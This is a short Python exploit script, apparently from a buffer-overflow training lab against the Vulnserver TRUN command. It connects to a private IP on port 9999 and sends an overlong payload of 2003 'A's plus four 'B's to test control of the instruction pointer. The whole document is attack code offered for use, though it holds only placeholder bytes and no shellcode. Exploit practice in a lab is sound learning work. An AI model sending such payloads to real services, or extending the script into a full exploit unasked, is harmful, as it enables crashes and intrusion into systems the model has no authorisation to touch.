#!/usr/bin/python3
import sys, socket      # importing modules
from time import sleep  # importing time from module sleep
payload = "A"*2003;
eip = "B"*4; # defining a variable buffer 
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("192.168.21.148",9999));
    s.send((("TRUN /.:/" + payload).encode() + eip));
    s.close();
except:
    print("Error in connecting");
    sys.exit();
